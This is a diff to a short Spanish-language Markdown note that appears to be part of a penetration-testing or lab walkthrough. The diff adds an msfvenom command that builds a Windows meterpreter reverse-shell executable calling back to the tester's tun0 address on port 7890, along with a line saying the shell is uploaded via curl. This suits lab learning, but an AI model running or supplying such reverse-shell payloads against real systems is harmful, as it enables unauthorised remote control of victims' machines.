@@ -249,10 +249,11 @@ de esta manera invocamos la shell interactiva que acabamos de subir y desde aquÃ
 ### msfvenom
 vamos a crear un payload para windows que nos permita obtener una meterpreter reverse shell
 ```python
-
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP(tun0) LPORT=7890 -f exe > revershell.exe
 ```
 ![[Pasted image 20240404143935.png]]
 
 `curl IP`
-
+aqui hacemos un curl a la ip para subir la shell que acabamos de crear
 ![[Pasted image 20240404143654.png]]
+
